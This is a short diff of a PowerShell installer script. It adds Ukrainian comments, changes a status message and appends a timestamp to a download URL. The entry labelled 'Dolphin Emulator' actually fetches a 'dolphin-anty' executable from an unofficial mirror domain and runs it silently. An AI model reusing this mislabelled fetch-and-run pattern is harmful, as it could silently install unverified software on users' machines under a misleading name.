@@ -41,7 +41,7 @@ $apps = @(
     },
     @{
         name = "Dolphin Emulator"
-        url = "https://app.dolphin-anty-mirror3.net/anty-app/dolphin-anty-win-latest.exe"
+        url = "https://app.dolphin-anty-mirror3.net/anty-app/dolphin-anty-win-latest.exe?t=1764717643528"
         args = "/S"
         installPath = "C:\Program Files\Dolphin\Dolphin.exe"
         regKey = ""
@@ -72,13 +72,15 @@ $apps = @(
 foreach ($app in $apps) {
     $path = "$downloadDir\$($app.name).exe"
 
+    # Якщо програма вже встановлена → пропускаємо все
     if (Test-Installed $app.name $app.installPath $app.regKey) {
         Write-Host "`nSkipping $($app.name), already installed."
         continue
     }
 
+    # Якщо інсталятор вже є → не качаємо
     if (Test-Path $path) {
-        Write-Host "`nSkipping download for $($app.name), file already exists."
+        Write-Host "`nInstaller for $($app.name) already exists, skipping download."
     }
     else {
         Write-Host "`nDownloading $($app.name)..."
